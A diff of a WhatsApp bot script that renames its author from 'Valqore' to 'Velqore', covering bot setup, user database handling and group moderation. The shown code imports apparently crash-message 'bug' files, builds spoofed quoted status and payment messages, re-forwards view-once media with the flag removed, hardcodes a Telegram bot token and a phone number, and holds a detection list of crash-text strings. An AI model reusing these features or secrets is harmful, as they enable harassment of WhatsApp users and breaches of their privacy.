@@ -1,11 +1,7 @@
-//base by Valqore
+//base by Velqore
 //re-upload? recode? copy code? give credit ya :)
-//YouTube: @Valqore
-//Instagram: unicorn_Valqore13
-//Telegram: t.me/ValqoreInc
-//GitHub: @Valqore
+//GitHub: @Velqore
 //WhatsApp: +918130784851
-//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@Valqore
 
 require('./lib/listmenu')
 const {
@@ -111,13 +107,13 @@ let bad = JSON.parse(fs.readFileSync('./src/data/function/badword.json'))
 let premium = JSON.parse(fs.readFileSync('./src/data/role/premium.json'))
 const owner = JSON.parse(fs.readFileSync('./src/data/role/owner.json'))
 //media
-const VoiceNoteValqore = JSON.parse(fs.readFileSync('./ValqoreMedia/database/Valqorevn.json'))
-const StickerValqore = JSON.parse(fs.readFileSync('./ValqoreMedia/database/Valqoresticker.json'))
-const ImageValqore = JSON.parse(fs.readFileSync('./ValqoreMedia/database/Valqoreimage.json'))
-const VideoValqore = JSON.parse(fs.readFileSync('./ValqoreMedia/database/Valqorevideo.json'))
-const DocValqore = JSON.parse(fs.readFileSync('./ValqoreMedia/database/doc.json'))
-const ZipValqore = JSON.parse(fs.readFileSync('./ValqoreMedia/database/zip.json'))
-const ApkValqore = JSON.parse(fs.readFileSync('./ValqoreMedia/database/apk.json'))
+const VoiceNoteVelqore = JSON.parse(fs.readFileSync('./VelqoreMedia/database/Velqorevn.json'))
+const StickerVelqore = JSON.parse(fs.readFileSync('./VelqoreMedia/database/Velqoresticker.json'))
+const ImageVelqore = JSON.parse(fs.readFileSync('./VelqoreMedia/database/Velqoreimage.json'))
+const VideoVelqore = JSON.parse(fs.readFileSync('./VelqoreMedia/database/Velqorevideo.json'))
+const DocVelqore = JSON.parse(fs.readFileSync('./VelqoreMedia/database/doc.json'))
+const ZipVelqore = JSON.parse(fs.readFileSync('./VelqoreMedia/database/zip.json'))
+const ApkVelqore = JSON.parse(fs.readFileSync('./VelqoreMedia/database/apk.json'))
 
 //bug database
 const { text1 } = require('./src/data/function/XBug/text1')
@@ -126,7 +122,7 @@ const { text3 } = require('./src/data/function/XBug/text3')
 const { text4 } = require('./src/data/function/XBug/text4')
 const { text5 } = require('./src/data/function/XBug/text5')
 
-const Valqoreverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))
+const Velqoreverifieduser = JSON.parse(fs.readFileSync('./src/data/role/user.json'))
 
 global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
 if (global.db.data) global.db.data = {
@@ -148,22 +144,22 @@ const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
 const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
 const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
-var Valqoreytimewisher = `Good Night 🌌`
+var Velqoreytimewisher = `Good Night 🌌`
  }
  if(time2 < "19:00:00"){
-var Valqoreytimewisher = `Good Evening 🌃`
+var Velqoreytimewisher = `Good Evening 🌃`
  }
  if(time2 < "18:00:00"){
-var Valqoreytimewisher = `Good Evening 🌃`
+var Velqoreytimewisher = `Good Evening 🌃`
  }
  if(time2 < "15:00:00"){
-var Valqoreytimewisher = `Good Afternoon 🌅`
+var Velqoreytimewisher = `Good Afternoon 🌅`
  }
  if(time2 < "11:00:00"){
-var Valqoreytimewisher = `Good Morning 🌄`
+var Velqoreytimewisher = `Good Morning 🌄`
  }
  if(time2 < "05:00:00"){
-var Valqoreytimewisher = `Good Morning 🌄`
+var Velqoreytimewisher = `Good Morning 🌄`
  } 
 //function
 const reSize = async(buffer, ukur1, ukur2) => {
@@ -175,7 +171,7 @@ const reSize = async(buffer, ukur1, ukur2) => {
    })
 }
 //module
-module.exports = ValqoreInc = async (ValqoreInc, m, chatUpdate, store) => {
+module.exports = VelqoreInc = async (VelqoreInc, m, chatUpdate, store) => {
     try {
         const {
             type,
@@ -195,7 +191,7 @@ module.exports = ValqoreInc = async (ValqoreInc, m, chatUpdate, store) => {
         const args = body.trim().split(/ +/).slice(1)
         const full_args = body.replace(command, '').slice(1).trim()
         const pushname = m.pushName || "No Name"
-        const botNumber = await ValqoreInc.decodeJid(ValqoreInc.user.id)
+        const botNumber = await VelqoreInc.decodeJid(VelqoreInc.user.id)
         const itsMe = m.sender == botNumber ? true : false
         const sender = m.sender
         const text = q = args.join(" ")
@@ -224,12 +220,12 @@ module.exports = ValqoreInc = async (ValqoreInc, m, chatUpdate, store) => {
         const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        //prefix 2
         const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix
-        const Valqoreybody = body.startsWith(pric)
-        const isCommand = Valqoreybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
+        const Velqoreybody = body.startsWith(pric)
+        const isCommand = Velqoreybody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
         const sticker = []
        //group
         const isGroup = m.key.remoteJid.endsWith('@g.us')
-        const groupMetadata = m.isGroup ? await ValqoreInc.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupMetadata = m.isGroup ? await VelqoreInc.groupMetadata(m.chat).catch(e => {}) : ''
         const groupName = m.isGroup ? groupMetadata.subject : ''
         const participants = m.isGroup ? await groupMetadata.participants : ''
         const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
@@ -240,63 +236,63 @@ module.exports = ValqoreInc = async (ValqoreInc, m, chatUpdate, store) => {
         const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
         const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
         //anti media
-        const isValqoreMedia = m.mtype
+        const isVelqoreMedia = m.mtype
         //user status
-        const isUser = Valqoreverifieduser.includes(sender)
-        const ValqoreTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-        const isPremium= ValqoreTheCreator || checkPremiumUser(m.sender, premium)
-        expiredPremiumCheck(ValqoreInc, m, premium)
+        const isUser = Velqoreverifieduser.includes(sender)
+        const VelqoreTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const isPremium= VelqoreTheCreator || checkPremiumUser(m.sender, premium)
+        expiredPremiumCheck(VelqoreInc, m, premium)
         
         //theme sticker reply
-        const ValqoreStickWait = () => {
-        let ValqoreStikRep = fs.readFileSync('./ValqoreMedia/theme/sticker_reply/wait.webp')
-        ValqoreInc.sendMessage(from, { sticker: ValqoreStikRep }, { quoted: m })
+        const VelqoreStickWait = () => {
+        let VelqoreStikRep = fs.readFileSync('./VelqoreMedia/theme/sticker_reply/wait.webp')
+        VelqoreInc.sendMessage(from, { sticker: VelqoreStikRep }, { quoted: m })
         }
-        const ValqoreStickAdmin = () => {
-        let ValqoreStikRep = fs.readFileSync('./ValqoreMedia/theme/sticker_reply/admin.webp')
-        ValqoreInc.sendMessage(from, { sticker: ValqoreStikRep }, { quoted: m })
+        const VelqoreStickAdmin = () => {
+        let VelqoreStikRep = fs.readFileSync('./VelqoreMedia/theme/sticker_reply/admin.webp')
+        VelqoreInc.sendMessage(from, { sticker: VelqoreStikRep }, { quoted: m })
         }
-        const ValqoreStickBotAdmin = () => {
-        let ValqoreStikRep = fs.readFileSync('./ValqoreMedia/theme/sticker_reply/botadmin.webp')
-        ValqoreInc.sendMessage(from, { sticker: ValqoreStikRep }, { quoted: m })
+        const VelqoreStickBotAdmin = () => {
+        let VelqoreStikRep = fs.readFileSync('./VelqoreMedia/theme/sticker_reply/botadmin.webp')
+        VelqoreInc.sendMessage(from, { sticker: VelqoreStikRep }, { quoted: m })
         }
-        const ValqoreStickOwner = () => {
-        let ValqoreStikRep = fs.readFileSync('./ValqoreMedia/theme/sticker_reply/owner.webp')
-        ValqoreInc.sendMessage(from, { sticker: ValqoreStikRep }, { quoted: m })
+        const VelqoreStickOwner = () => {
+        let VelqoreStikRep = fs.readFileSync('./VelqoreMedia/theme/sticker_reply/owner.webp')
+        VelqoreInc.sendMessage(from, { sticker: VelqoreStikRep }, { quoted: m })
         }
-        const ValqoreStickGroup = () => {
-        let ValqoreStikRep = fs.readFileSync('./ValqoreMedia/theme/sticker_reply/group.webp')
-        ValqoreInc.sendMessage(from, { sticker: ValqoreStikRep }, { quoted: m })
+        const VelqoreStickGroup = () => {
+        let VelqoreStikRep = fs.readFileSync('./VelqoreMedia/theme/sticker_reply/group.webp')
+        VelqoreInc.sendMessage(from, { sticker: VelqoreStikRep }, { quoted: m })
         }
-        const ValqoreStickPrivate = () => {
-        let ValqoreStikRep = fs.readFileSync('./ValqoreMedia/theme/sticker_reply/private.webp')
-        ValqoreInc.sendMessage(from, { sticker: ValqoreStikRep }, { quoted: m })
+        const VelqoreStickPrivate = () => {
+        let VelqoreStikRep = fs.readFileSync('./VelqoreMedia/theme/sticker_reply/private.webp')
+        VelqoreInc.sendMessage(from, { sticker: VelqoreStikRep }, { quoted: m })
         }
         //premium
         async function replyprem(teks) {
-    replygcValqore(`This feature is for premium user, contact the owner to become premium user`)
+    replygcVelqore(`This feature is for premium user, contact the owner to become premium user`)
 }
         //script replier
-        async function sendValqoreIncMessage(chatId, message, options = {}){
+        async function sendVelqoreIncMessage(chatId, message, options = {}){
     let generate = await generateWAMessage(chatId, message, options)
     let type2 = getContentType(generate.message)
     if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
     if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
-    return await ValqoreInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
+    return await VelqoreInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
 }
         //reply
-        async function replygcValqore(teks) {
+        async function replygcVelqore(teks) {
             if (typereply === 'v1') {
                 m.reply(teks)
             } else if (typereply === 'v2') {
-                ValqoreInc.sendMessage(m.chat, {
+                VelqoreInc.sendMessage(m.chat, {
                     contextInfo: {
                         externalAdReply: {
                             showAdAttribution: true,
                             title: botname,
                             body: ownername,
                             previewType: "PHOTO",
-                            thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                            thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                             sourceUrl: wagc
                         }
                     },
@@ -305,14 +301,14 @@ module.exports = ValqoreInc = async (ValqoreInc, m, chatUpdate, store) => {
                     quoted: m
                 });
             } else if (typereply === 'v3') {
-               ValqoreInc.sendMessage(m.chat, {
+               VelqoreInc.sendMessage(m.chat, {
                   text: teks,
                   contextInfo: {
                      externalAdReply: {
                         showAdAttribution: true,
                         title: botname,
                         body: ownername,
-                        thumbnail: fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),
+                        thumbnail: fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),
                         sourceUrl: websitex,
                         mediaType: 1,
                         renderLargerThumbnail: true
@@ -385,7 +381,7 @@ module.exports = ValqoreInc = async (ValqoreInc, m, chatUpdate, store) => {
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
 		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
 		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=918130784851:918130784851\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
-	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./ValqoreMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
+	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./VelqoreMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
 	    const frpayment = {
 	key: {
 		remoteJid: '0@s.whatsapp.net',
@@ -429,7 +425,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                 if (!('title' in user)) user.title = ''
                 if (!('serialNumber' in user)) user.serialNumber = randomBytes(16).toString('hex') 
                 if (!('afkReason' in user)) user.afkReason = ''
-                if (!('nick' in user)) user.nick = ValqoreInc.getName(sender)
+                if (!('nick' in user)) user.nick = VelqoreInc.getName(sender)
                 if (!isPremium) user.premium = false
                 if (!('totalLimit' in user)) user.totalLimit = 0
                 if (!isNumber(user.limit)) user.limit = limitUser
@@ -439,7 +435,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                afkTime: -1,
                badword: 0,
                afkReason: '',
-               nick: ValqoreInc.getName(sender),
+               nick: VelqoreInc.getName(sender),
                premium: `${isPremium ? 'true' : 'false'}`,
                limit: limitUser,
                totalLimit: 0
@@ -501,7 +497,7 @@ return arr[Math.floor(Math.random() * arr.length)]
                if (!('onlygrub' in setting)) setting.onlygrub = false
                if (!('onlypc' in setting)) setting.onlypc = false
                if (!('watermark' in setting)) setting.watermark = { packname , author }
-               if (!('about' in setting)) setting.about = { bot: { nick: ValqoreInc.getName(botNumber), alias: botname}, owner: { nick: ValqoreInc.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
+               if (!('about' in setting)) setting.about = { bot: { nick: VelqoreInc.getName(botNumber), alias: botname}, owner: { nick: VelqoreInc.getName(global.ownernumber + '@s.whatsapp.net'), alias: global.ownernumber}}
             } else global.db.data.settings[botNumber] = {
                totalhit: 0,
                totalError: 0,
@@ -523,11 +519,11 @@ return arr[Math.floor(Math.random() * arr.length)]
                },
                about: {
                   bot: {
-                     nick: ValqoreInc.getName(botNumber), 
+                     nick: VelqoreInc.getName(botNumber), 
                      alias: botname
                   },
                   owner: {
-                     nick: ValqoreInc.getName(global.ownernumber + '@s.whatsapp.net'), 
+                     nick: VelqoreInc.getName(global.ownernumber + '@s.whatsapp.net'), 
                      alias: global.ownernumber
                   }
                }
@@ -597,7 +593,7 @@ return build_server + data.image
 
 //bug loading
 async function loading () {
-var Valqorelod = [
+var Velqorelod = [
 "《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
 "《 ████▒▒▒▒▒▒▒▒》30%",
 "《 ███████▒▒▒▒▒》50%",
@@ -605,10 +601,10 @@ var Valqorelod = [
 "《 ████████████》100%",
 "𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
 ]
-let { key } = await ValqoreInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
+let { key } = await VelqoreInc.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})
 
-for (let i = 0; i < Valqorelod.length; i++) {
-await ValqoreInc.sendMessage(from, {text: Valqorelod[i], edit: key })
+for (let i = 0; i < Velqorelod.length; i++) {
+await VelqoreInc.sendMessage(from, {text: Velqorelod[i], edit: key })
 }
 }
 
@@ -655,21 +651,21 @@ async function styletext(teks) {
         
         async function Telesticker(url) {
     return new Promise(async (resolve, reject) => {
-        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcValqore('Enther your url telegram sticker link')
+        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return replygcVelqore('Enther your url telegram sticker link')
         packName = url.replace("https://t.me/addstickers/", "")
         data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
-        const Valqoreyresult = []
+        const Velqoreyresult = []
         for (let i = 0; i < data.data.result.stickers.length; i++) {
             fileId = data.data.result.stickers[i].thumb.file_id
             data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
             result = {
             status: 200,
-            author: 'Valqore',
+            author: 'Velqore',
             url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
             }
-            Valqoreyresult.push(result)
+            Velqoreyresult.push(result)
         }
-    resolve(Valqoreyresult)
+    resolve(Velqoreyresult)
     })
 }
         
@@ -677,87 +673,87 @@ async function styletext(teks) {
         async function useLimit(senuseLimitder, amount) {
             db.data.users[sender].limit -= amount
             db.data.users[sender].totalLimit += amount
-            replygcValqore(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
+            replygcVelqore(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
         }
         async function resetLimit() {
             let users = Object.keys(global.db.data.users)
-            let LimitValqore = isPremium ? limit.prem : limit.free
+            let LimitVelqore = isPremium ? limit.prem : limit.free
             for (let i of users) {
-               db.data.users[i].limit = LimitValqore
+               db.data.users[i].limit = LimitVelqore
             }
-            ValqoreInc.sendText('120363167338947238@g.us', { text: `Reset Limit`})
+            VelqoreInc.sendText('120363167338947238@g.us', { text: `Reset Limit`})
         }
         // Grup Only
-        if (!m.isGroup && !ValqoreTheCreator && db.data.settings[botNumber].onlygrub ) {
+        if (!m.isGroup && !VelqoreTheCreator && db.data.settings[botNumber].onlygrub ) {
         	if (isCommand){
-            return replygcValqore(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
+            return replygcVelqore(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
             }
         }
         // Private Only
-        if (!ValqoreTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
+        if (!VelqoreTheCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
         	if (isCommand){
-	         return replygcValqore("Hello buddy! if you want to use this bot, please chat the bot in private chat")
+	         return replygcVelqore("Hello buddy! if you want to use this bot, please chat the bot in private chat")
 	     }
 	}
 	     
-        if (!ValqoreInc.public) {
-            if (ValqoreTheCreator && !m.key.fromMe) return
+        if (!VelqoreInc.public) {
+            if (VelqoreTheCreator && !m.key.fromMe) return
         }
         if (db.data.settings[botNumber].online) {
         	if (isCommand) {
-        	ValqoreInc.sendPresenceUpdate('unavailable', from)
+        	VelqoreInc.sendPresenceUpdate('unavailable', from)
         }
         }
         if (db.data.settings[botNumber].autoread) {
-            ValqoreInc.readMessages([m.key])
+            VelqoreInc.readMessages([m.key])
         }
         //auto set bio\\
 	if (db.data.settings[botNumber].autobio) {
-            ValqoreInc.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
+            VelqoreInc.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
         }
      //auto type record
         if (db.data.settings[botNumber].autorecordtype){
         if (isCommand) {
-            let Valqoremix = ['composing', 'recording']
-            Valqoremix2 = Valqoremix[Math.floor(Valqoremix.length * Math.random())]
-            ValqoreInc.sendPresenceUpdate(Valqoremix2, from)
+            let Velqoremix = ['composing', 'recording']
+            Velqoremix2 = Velqoremix[Math.floor(Velqoremix.length * Math.random())]
+            VelqoreInc.sendPresenceUpdate(Velqoremix2, from)
         }
         }
         if (db.data.settings[botNumber].autorecord){
         if (isCommand) {
-        	let Valqoremix = ['recording']
-            Valqoremix2 = Valqoremix[Math.floor(Valqoremix.length * Math.random())]
-            ValqoreInc.sendPresenceUpdate(Valqoremix2, from)
+        	let Velqoremix = ['recording']
+            Velqoremix2 = Velqoremix[Math.floor(Velqoremix.length * Math.random())]
+            VelqoreInc.sendPresenceUpdate(Velqoremix2, from)
         }
         }
         if (db.data.settings[botNumber].autotype){
         if (isCommand) {
-        	let Valqorepos = ['composing']
-            ValqoreInc.sendPresenceUpdate(Valqorepos, from)
+        	let Velqorepos = ['composing']
+            VelqoreInc.sendPresenceUpdate(Velqorepos, from)
         }
         }
         
         //auto block number
         if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
-            return ValqoreInc.updateBlockStatus(m.sender, 'block')
+            return VelqoreInc.updateBlockStatus(m.sender, 'block')
         }
         if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
-            return ValqoreInc.updateBlockStatus(m.sender, 'block')
+            return VelqoreInc.updateBlockStatus(m.sender, 'block')
         }
         if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
-            return ValqoreInc.updateBlockStatus(m.sender, 'block')
+            return VelqoreInc.updateBlockStatus(m.sender, 'block')
         } 
         if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
-        	if (ValqoreTheCreator || isAdmins || !isBotAdmins) return
-            ValqoreInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
+        	if (VelqoreTheCreator || isAdmins || !isBotAdmins) return
+            VelqoreInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
             await sleep(2000)
-            await ValqoreInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+            await VelqoreInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
         }
         let list = []
 for (let i of owner) {
 list.push({
-	    	displayName: await ValqoreInc.getName(i),
-	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await ValqoreInc.getName(i)}\nFN:${await ValqoreInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
+	    	displayName: await VelqoreInc.getName(i),
+	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await VelqoreInc.getName(i)}\nFN:${await VelqoreInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
 	    })
 	}
         //console log
@@ -773,19 +769,19 @@ list.push({
         let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
         delete msg[Object.keys(msg)[0]].viewOnce
         val.message = msg
-        await ValqoreInc.sendMessage(m.chat, { forward: val }, { quoted: m })
+        await VelqoreInc.sendMessage(m.chat, { forward: val }, { quoted: m })
     }
         //ANTI VIRUS
 if (isGroup && db.data.chats[m.chat].antivirtex) {
 if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
-if (isGroupAdmins) return replygcValqore('*VIRTEX DETECTED*')
+if (isGroupAdmins) return replygcVelqore('*VIRTEX DETECTED*')
 console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
-ValqoreInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
